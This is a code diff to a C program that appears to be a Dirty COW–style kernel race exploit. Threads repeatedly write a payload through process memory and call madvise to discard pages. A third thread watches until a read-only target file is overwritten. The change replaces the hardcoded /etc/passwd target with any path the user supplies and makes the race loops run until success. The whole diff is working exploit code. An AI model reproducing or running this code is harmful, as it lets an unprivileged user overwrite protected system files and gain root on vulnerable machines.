@@ -40,12 +40,13 @@
 #define THREAD_ITERATIONS 10000
 
 char *progname = NULL;
-int stop = 0;
+bool stop_thread = false;
 
 typedef struct payload_info {
 	char *payload;
 	off_t offset;
 	void *loc_in_mem;
+    char *target_path;
 	int target_fd;
 } PayloadInfo;
 
@@ -58,7 +59,7 @@ static void *writer_thread(void *arg) {
 	int mem_fd = open(VIRTUAL_MEMORY, O_RDWR);
 	ERR_IF(mem_fd < 0);
 
-	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
+	while (!stop_thread) {
 		lseek(mem_fd, (off_t) payload_offset, SEEK_SET);
 		write(mem_fd, str, strlen(str));
 	}
@@ -70,7 +71,7 @@ static void *writer_thread(void *arg) {
 static void *madviser_thread(void *arg) {
 	PayloadInfo *info = arg;
 
-	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
+	while (!stop_thread) {
 		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
 	}
 
@@ -85,14 +86,14 @@ static void *wait_for_write(void *arg) {
 		char buf[len];
 		memset(buf, '\0', len);
 
-		int fd = open("/etc/passwd", O_RDONLY);
+		int fd = open(info->target_path, O_RDONLY);
 		ERR_IF(fd < 0);
 
 		ERR_IF(lseek(fd, info->offset, SEEK_SET) < 0);
 		ERR_IF(read(fd, buf, len) < 0);
 
 		if (memcmp(buf, info->payload, len) == 0) {
-			printf("Target file is overwritten\n");
+			puts("Target file is overwritten");
 			break;
 		}
 
@@ -100,8 +101,8 @@ static void *wait_for_write(void *arg) {
 		sleep(1);
 	}
 
-	stop = 1;
-	printf("Stop set to 1\n"); 
+	stop_thread = true;
+	puts("Stopping threads"); 
 
 	return NULL;
 }
@@ -256,6 +257,9 @@ static PayloadInfo parse_opts(int argc, char *argv[]) {
 	// make sure target path is readable
 	char *target_path = argv[optind];
 	ERR_IF(access(target_path, R_OK) < 0);
+
+    info.target_path = strdup(target_path);
+    ERR_IF(info.target_path == NULL);
 
 	if (info.payload == NULL) {
 		// no payload options were given; assume stdin
